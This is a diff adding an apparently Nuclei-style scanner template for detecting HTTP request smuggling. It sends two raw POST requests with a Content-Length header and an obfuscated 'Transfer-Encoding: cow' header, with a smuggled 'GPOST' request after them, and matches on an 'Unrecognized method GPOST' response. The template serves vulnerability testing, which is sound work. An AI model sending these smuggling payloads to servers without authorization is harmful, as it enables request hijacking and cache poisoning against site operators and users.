@@ -1,0 +1,45 @@
+id: HTTP request smuggling, obfuscating the TE header
+
+info:
+  name: HTTP request smuggling, obfuscating the TE header
+  author: falcon_319
+  severity: critical
+
+requests:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 4
+      Transfer-Encoding: cow
+
+      5c
+	    GPOST / HTTP/1.1
+	    Content-Type: application/x-www-form-urlencoded
+	    Content-Length: 15
+
+      x=1
+	    0
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 4
+      Transfer-Encoding: cow
+      
+      5c
+	    GPOST / HTTP/1.1
+	    Content-Type: application/x-www-form-urlencoded
+	    Content-Length: 15
+
+      x=1
+	    0
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "Unrecognized method GPOST")'
